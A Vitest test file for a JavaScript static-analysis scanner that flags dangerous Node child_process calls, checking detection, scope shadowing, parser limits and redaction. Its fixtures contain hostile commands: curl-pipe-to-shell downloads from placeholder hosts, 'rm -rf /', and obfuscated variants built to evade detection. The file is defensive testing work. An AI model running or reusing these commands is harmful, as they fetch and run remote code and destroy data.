import { afterEach, beforeEach, expect, it } from 'vitest';
import { createRequire } from 'node:module';
import { createHash } from 'node:crypto';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';

const require = createRequire(import.meta.url);
const { scanStaticDirectory } = require('../../src/main/static-analysis');
let root;

beforeEach(() => {
  root = fs.mkdtempSync(path.join(os.tmpdir(), 'aegis-static-js-'));
});
afterEach(() => {
  expect(path.dirname(path.resolve(root))).toBe(path.resolve(os.tmpdir()));
  fs.rmSync(root, { recursive: true, force: true });
});

async function scan(source, name = 'commands.cjs') {
  fs.writeFileSync(path.join(root, name), source);
  return scanStaticDirectory('package', root);
}

it('finds a shell pipeline reached through a CommonJS alias and a constant string', async () => {
  const source = [
    'const { exec: run } = require("node:child_process");',
    'const command = "curl https://PRIVATE.invalid/install | sh";',
    'run(command);',
  ].join('\n');
  const report = await scan(source);
  expect(report.findings).toEqual([
    expect.objectContaining({
      ruleId: 'STA001',
      path: 'commands.cjs',
      line: 3,
      context: 'javascript-command',
      sha256: createHash('sha256').update(source).digest('hex'),
    }),
  ]);
  expect(report.files[0].analysis).toBe('javascript-command-ast');
  expect(report.safety).toBe('not-determined');
  expect(JSON.stringify(report)).not.toContain('PRIVATE');
});

it('does not treat a locally declared require function as the Node module loader', async () => {
  const report = await scan(
    [
      'function require() { return { exec() {} }; }',
      'const { exec: run } = require("node:child_process");',
      'run("curl https://example.invalid | sh");',
    ].join('\n'),
  );
  expect(report.findings).toEqual([]);
  expect(report.complete).toBe(false);
});

it('distinguishes literal argv from a shell command in an imported spawn call', async () => {
  const prefix = 'import { spawn as launch } from "node:child_process";\n';
  const argv = '"curl", ["https://PRIVATE.invalid/install", "|", "sh"]';
  const literal = await scan(prefix + 'launch(' + argv + ');', 'commands.mjs');
  expect(literal.findings).toEqual([]);
  const shell = await scan(prefix + 'launch(' + argv + ', {shell: true});', 'commands.mjs');
  expect(shell.findings).toEqual([
    expect.objectContaining({ ruleId: 'STA001', line: 2, context: 'javascript-command' }),
  ]);
  expect(JSON.stringify(shell)).not.toContain('PRIVATE');
});

it('invalidates imported method knowledge after a module method is overwritten', async () => {
  const report = await scan(
    [
      'const cp = require("node:child_process");',
      'cp.exec = () => {};',
      'cp.exec("curl https://example.invalid | sh");',
    ].join('\n'),
  );
  expect(report.findings).toEqual([]);
  expect(report.issues).toContainEqual({
    path: 'commands.cjs',
    reason: 'javascript-mutation-not-resolved',
  });
});

it.each([
  [
    'CommonJS member',
    'const cp = require("child_process"); cp["execSync"]("rm -rf /");',
    'commands.js',
    'STA003',
  ],
  [
    'direct require',
    'require("node:child_process").exec("curl https://PRIVATE.invalid | sh");',
    'commands.cjs',
    'STA001',
  ],
  [
    'module default',
    'import cp from "node:child_process"; cp.execFileSync("rm", ["-rf", "/"]);',
    'commands.mjs',
    'STA003',
  ],
  [
    'module namespace',
    'import * as cp from "child_process"; cp.spawnSync("rm", ["-rf", "/"]);',
    'commands.js',
    'STA003',
  ],
  [
    'module named',
    'import { execFile as run } from "node:child_process"; run("sh", ["-c", "curl https://PRIVATE.invalid | sh"], () => {});',
    'commands.mjs',
    'STA001',
  ],
  [
    'constant template',
    'const cp = require("child_process"); const url = "https://PRIVATE.invalid"; const run = cp.exec; run(`cu${"rl"} ${url}` + " | sh");',
    'commands.cjs',
    'STA001',
  ],
  [
    'escaped literal',
    'const {exec} = require("child_process"); exec("\\x63url https://PRIVATE.invalid \\u007c sh");',
    'commands.cjs',
    'STA001',
  ],
])(
  'inspects %s calls with fixed evidence and redacted source',
  async (_label, source, name, ruleId) => {
    const report = await scan(source, name);
    expect(report.findings.map((finding) => finding.ruleId)).toEqual([ruleId]);
    expect(JSON.stringify(report)).not.toContain('PRIVATE');
  },
);

it.each([
  'const cp = require("child_process"); cp.spawn("echo", ["curl https://example.invalid | sh"]);',
  'const cp = require("child_process"); cp.execFile("echo", ["rm -rf /"]);',
  'const cp = require("child_process"); cp.exec("rm -rf ./dist");',
  'const cp = require("child_process"); cp.spawn("npx", ["tool@1.2.3"]);',
  'const example = "require(\\"child_process\\").exec(\\"rm -rf /\\")"; // exec("rm -rf /")\nconst regex = /exec\\(.*\\)/;',
])('does not turn literal data or ordinary commands into findings: %s', async (source) => {
  const report = await scan(source);
  expect(report.findings).toEqual([]);
  expect(report.complete).toBe(true);
  expect(report.safety).toBe('not-determined');
});

it.each([
  'function task(require) { require("child_process").exec("rm -rf /"); }',
  'function task() { require("child_process").exec("rm -rf /"); var require; }',
  'try {} catch (require) { require("child_process").exec("rm -rf /"); }',
  'const {exec} = require("child_process"); { const exec = () => {}; exec("rm -rf /"); }',
  'const {exec} = require("child_process"); function task(exec) { exec("rm -rf /"); }',
  'if (true) { function require() {} } require("child_process").exec("rm -rf /");',
])('keeps shadowed or hoisted local names unresolved: %s', async (source) => {
  const report = await scan(source);
  expect(report.findings).toEqual([]);
  expect(report.complete).toBe(false);
});

it.each([
  [
    'const cp = require("child_process"); Object.assign(cp, {}); cp.exec("rm -rf /");',
    'javascript-module-escape-not-resolved',
  ],
  [
    'const cp = require("child_process"); const wrapped = {cp}; cp.exec("rm -rf /");',
    'javascript-module-escape-not-resolved',
  ],
  [
    'const {exec} = require("child_process"); exec = () => {}; exec("rm -rf /");',
    'javascript-mutation-not-resolved',
  ],
  [
    'require = customLoader; require("child_process").exec("rm -rf /");',
    'javascript-mutation-not-resolved',
  ],
  [
    'const cp = require("child_process"); eval("PRIVATE"); cp.exec("rm -rf /");',
    'javascript-dynamic-code-not-analyzed',
  ],
])('invalidates mutable or escaped process references: %s', async (source, reason) => {
  const report = await scan(source);
  expect(report.findings).toEqual([]);
  expect(report.issues).toContainEqual({ path: 'commands.cjs', reason });
  expect(JSON.stringify(report)).not.toContain('PRIVATE');
});

it.each([
  ['cp.exec(process.env.PRIVATE);', 'javascript-command-not-resolved'],
  ['const argv = ["-rf", "/"]; cp.spawn("rm", argv);', 'javascript-mutable-binding-not-resolved'],
  ['cp.spawn("rm", ["-rf", process.env.PRIVATE]);', 'javascript-argv-not-resolved'],
  ['cp.spawn("rm", ["-rf", "/"], {shell: process.env.PRIVATE});', 'javascript-shell-not-resolved'],
  ['cp.spawn("rm", ["-rf", "/"], {shell: "/PRIVATE/unknown"});', 'javascript-shell-not-resolved'],
  [
    'cp.spawn("rm", ["-rf", "/"], {get shell() { throw new Error("PRIVATE"); }});',
    'javascript-options-not-resolved',
  ],
  ['cp.exec(...PRIVATE);', 'javascript-call-not-analyzed'],
  ['cp.exec?.("rm -rf /");', 'javascript-call-not-analyzed'],
  ['cp.fork("PRIVATE.cjs");', 'referenced-code-not-analyzed'],
  ['const cp2 = require("./PRIVATE.cjs"); cp2.exec("rm -rf /");', 'javascript-module-not-resolved'],
])('reports unsupported inputs without guessing or leaking source: %s', async (source, reason) => {
  const report = await scan('const cp = require("node:child_process"); ' + source);
  expect(report.findings).toEqual([]);
  expect(report.complete).toBe(false);
  expect(report.issues).toContainEqual({ path: 'commands.cjs', reason });
  expect(JSON.stringify(report)).not.toContain('PRIVATE');
});

it('keeps findings in conditional code while declaring that reachability is unknown', async () => {
  const report = await scan(
    'const cp = require("child_process"); if (false) { cp.exec("rm -rf /"); }',
  );
  expect(report.findings).toContainEqual(expect.objectContaining({ ruleId: 'STA003' }));
  expect(report.issues).toContainEqual({
    path: 'commands.cjs',
    reason: 'javascript-control-flow-not-evaluated',
  });
  expect(report.complete).toBe(false);
});

it('reports unexplored process options alongside a resolved command', async () => {
  const report = await scan(
    'const cp = require("child_process"); cp.exec("rm -rf /", {env: {PRIVATE: "secret"}});',
  );
  expect(report.findings).toContainEqual(expect.objectContaining({ ruleId: 'STA003' }));
  expect(report.issues).toContainEqual({
    path: 'commands.cjs',
    reason: 'javascript-process-options-not-analyzed',
  });
  expect(JSON.stringify(report)).not.toContain('PRIVATE');
});

it.each([
  ['const PRIVATE = ;', 'javascript-parse-failed'],
  ['// PRIVATE\n' + ' '.repeat(65536), 'javascript-size-limit'],
  ['('.repeat(65) + 'PRIVATE' + ')'.repeat(65), 'javascript-parser-limit'],
  [';'.repeat(8193) + '// PRIVATE', 'javascript-parser-limit'],
  ['const object = {' + 'PRIVATE,'.repeat(2800) + '};', 'javascript-ast-limit'],
  [Array(66).fill('"PRIVATE"').join(' + '), 'javascript-ast-limit'],
  [
    'const {exec} = require("child_process"); exec("' + 'PRIVATE'.repeat(2400) + '");',
    'javascript-value-limit',
  ],
])('bounds parsing and resolution with redacted errors (case %#)', async (source, reason) => {
  const report = await scan(source);
  expect(report.findings).toEqual([]);
  expect(report.complete).toBe(false);
  expect(report.issues).toContainEqual({ path: 'commands.cjs', reason });
  expect(JSON.stringify(report)).not.toContain('PRIVATE');
});

it('stops exponential constant expansion at the shared value-work budget', async () => {
  const declarations = ['const value0 = "";'];
  for (let i = 1; i < 25; i++)
    declarations.push(`const value${i} = value${i - 1} + value${i - 1};`);
  const report = await scan(declarations.join('\n') + '\nrequire("child_process").exec(value24);');
  expect(report.findings).toEqual([]);
  expect(report.issues).toContainEqual({ path: 'commands.cjs', reason: 'javascript-value-limit' });
  expect(report.complete).toBe(false);
});

it('caps inspected calls and findings and exposes both truncation and parser budgets', async () => {
  const report = await scan(
    'const {exec} = require("child_process");\n' + 'exec("rm -rf /");\n'.repeat(257),
  );
  expect(report.files[0].commands).toBe(256);
  expect(report.findings).toHaveLength(256);
  expect(report.issues).toContainEqual({ path: 'commands.cjs', reason: 'command-count-limit' });
  expect(report.limits).toMatchObject({
    javascriptChars: 65536,
    javascriptTokens: 8192,
    javascriptNodes: 8192,
    javascriptDepth: 64,
    javascriptValueSteps: 8192,
  });
  expect(report.scope).toMatchObject({
    javascript: 'literal-node-child-process-calls',
    javascriptControlFlow: 'not-evaluated',
  });
});
